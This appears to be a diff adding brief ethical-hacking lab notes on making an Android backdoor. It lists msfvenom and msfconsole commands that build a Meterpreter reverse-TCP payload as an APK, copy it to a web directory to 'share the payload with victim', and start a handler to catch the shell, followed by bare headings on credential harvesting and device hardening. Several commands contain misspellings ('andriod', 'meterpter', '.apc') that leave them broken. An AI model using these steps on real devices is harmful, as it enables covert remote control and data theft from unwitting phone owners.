@@ -1,0 +1,29 @@
+1- Creating Binary Payloads using Kali Linux to hack Andriod
+
+service postgresql start
+
+msfvenom -l 
+choose andriod/meterpreter/reverse_tcp
+msfvenom -p andriod/meterpreter/reverse_tcp --platform andriod -a dalvik LHOST=<ip address> R > Desktop/backdoor.apk
+
+now share the payload with victim
+
+cp /root/Desktop/backdoor.apc /var/www/html/share
+
+msfconsole -q
+
+use exploit/multi/handler
+
+set payload andriod/meterpter/reverse_tcp
+set LHOST <IP address> 
+show options 
+exploit -j z
+
+Launch Andriod emulator in a VM. 
+open Chrome and download backdoor.apk and install the app. 
+
+2- Harvesting User's Credentials using Social Engineering Toolkit
+
+Hacking Andriod Device with a Malicious App using theFatRat
+
+Securing Andriod Devices from Malicious Applications
